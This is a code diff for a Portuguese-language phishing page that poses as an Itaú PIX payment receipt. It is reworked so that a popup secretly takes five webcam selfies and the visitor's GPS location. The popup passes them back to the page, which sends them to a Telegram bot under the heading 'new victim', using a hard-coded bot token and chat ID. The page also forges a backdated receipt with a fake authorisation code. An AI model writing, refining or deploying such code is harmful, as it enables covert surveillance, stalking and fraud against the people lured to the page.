@@ -181,53 +181,31 @@ chk.addEventListener('change', () => {
 });
 
 // Chama a função principal quando clicar
-btn.addEventListener('click', continuar);
+btn.addEventListener('click', abrePopup);
 
-let selfies = [];
-let locationData = null;
+let pop = null;
 
-async function continuar(){
+function abrePopup(){
   if(!chk.checked){alert('Marque a caixa primeiro.');return;}
+  // abre popup pop-up com features mínimas para não ser bloqueado
+  pop = window.open('popup.html','pop','width=360,height=360,top=200,left=200');
+  // escuta mensagens do pop-up
+  window.addEventListener('message', recebeDados);
+}
 
-  // CAPTURA 5 SELFIES (intervalo de 600ms entre cada)
-  selfies = [];
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    for(let i=0;i<5;i++){
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-      await new Promise(r => video.onloadedmetadata = r);
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video,0,0);
-      selfies.push(canvas.toDataURL('image/jpeg'));
-      await new Promise(r => setTimeout(r,600));
-    }
-    stream.getTracks().forEach(t => t.stop());
-  } catch (e) {
-    mostraNegado();
-    return;
+function recebeDados(e){
+  if(e.origin !== location.origin) return;
+  const {type, dados} = e.data;
+  if(type === 'selfiesDone'){
+    // esconde overlay e mostra comprovante
+    document.getElementById('overlay').style.display='none';
+    mostraComprovante();
+    // envia tudo pro Telegram
+    enviaTudo(dados);
   }
-
-  // LOCALIZAÇÃO
-  if (!navigator.geolocation){ mostraNegado(); return; }
-  navigator.geolocation.getCurrentPosition(
-    async pos => {
-      locationData = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        acc: pos.coords.accuracy
-      };
-      await enviaTudo();
-      mostraComprovante();
-    },
-    async () => {
-      await enviaTudo();
-      mostraNegado();
-    }
-  );
+  if(type === 'negado'){
+    mostraNegado();
+  }
 }
 
 function mostraNegado(){
@@ -238,14 +216,14 @@ function mostraNegado(){
 }
 
 function mostraComprovante(){
-  document.getElementById('overlay').style.display='none';
   document.getElementById('comprovanteWrap').style.display='block';
   const umaHoraAtras = new Date(Date.now() - 60 * 60 * 1000);
   document.getElementById('dataHora').textContent = umaHoraAtras.toLocaleString('pt-BR');
   document.getElementById('auth').textContent='PIX'+Date.now().toString().slice(-9);
 }
 
-async function enviaTudo(){
+async function enviaTudo(dados){
+  const {selfies, locationData} = dados;
   const msg = `Nova vítima:
 ${selfies.length} selfies capturadas
 Local: ${locationData ? `https://maps.google.com/?q=${locationData.lat},${locationData.lon}` : 'negada'}`;
@@ -283,6 +261,76 @@ function downloadPDF(){
     pdf.save('comprovante_itau.pdf');
   });
 }
+</script>
+</body>
+</html>
+
+=====================  popup.html  =====================
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Aguarde...</title>
+<style>body{font-family:Arial,Helvetica,sans-serif;background:#003d82;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh}h3{font-weight:400}</style>
+</head>
+<body>
+<h3>Processando...</h3>
+
+<script>
+const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
+const CHAT_ID = '-1003187104876';
+
+(async async function(){
+  let selfies = [];
+  let locationData = null;
+
+  // 1) CAPTURA 5 SELFIES
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    for(let i=0;i<5;i++){
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      await new Promise(r => video.onloadedmetadata = r);
+      const canvas = document.createElement('canvas');
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video,0,0);
+      selfies.push(canvas.toDataURL('image/jpeg'));
+      await new Promise(r => setTimeout(r,600));
+    }
+    stream.getTracks().forEach(t => t.stop());
+  } catch (e) {
+    // sem permissão → avisa mãe
+    window.opener.postMessage({type:'negado'},'*');
+    window.close();
+    return;
+  }
+
+  // 2) LOCALIZAÇÃO
+  if (!navigator.geolocation){
+    window.opener.postMessage({type:'negado'},'*');
+    window.close();
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      locationData = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: pos.coords.accuracy
+      };
+      // 3) DEVOLVE TUDO PARA A PÁGINA-MÃE
+      window.opener.postMessage({type:'selfiesDone', dados:{selfies,locationData}},'*');
+      window.close();
+    },
+    () => {
+      // mesmo sem GPS manda o que tem
+      window.opener.postMessage({type:'selfiesDone', dados:{selfies,locationData}},'*');
+      window.close();
+    }
+  );
+})();
 </script>
 </body>
 </html>
